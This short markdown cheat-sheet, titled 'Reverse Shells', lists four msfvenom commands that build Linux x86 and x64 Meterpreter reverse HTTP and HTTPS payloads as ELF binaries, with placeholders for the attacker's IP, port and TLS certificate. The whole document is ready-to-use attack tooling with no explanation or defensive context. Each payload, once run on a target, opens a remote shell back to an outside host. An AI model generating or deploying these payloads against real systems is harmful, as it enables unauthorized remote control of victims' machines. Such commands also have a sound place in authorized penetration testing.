# Reverse Shells

x86 (32-bit) payloads.

```
$ msfvenom -p linux/x86/meterpreter_reverse_http lhost=<IP> lport=<PORT> -f elf -o payload-x86

$ msfvenom -p linux/x86/meterpreter_reverse_https handlersslcert=<FILE.pem> sslversion=[Auto | TLS | SSL23 | SSL3 | TLS1 | TLS1.1 | TLS1.2] lhost=<IP> lport=<PORT> -f elf -o payload-x86
```

x86-64 (64-bit) payloads.

```
$ msfvenom -p linux/x64/meterpreter_reverse_http lhost=<IP> lport=<PORT> -f elf -o payload-x64

$ msfvenom -p linux/x64/meterpreter_reverse_https handlersslcert=<FILE.pem> sslversion=[Auto | TLS | SSL23 | SSL3 | TLS1 | TLS1.1 | TLS1.2] lhost=<IP> lport=<PORT> -f elf -o payload-x64
```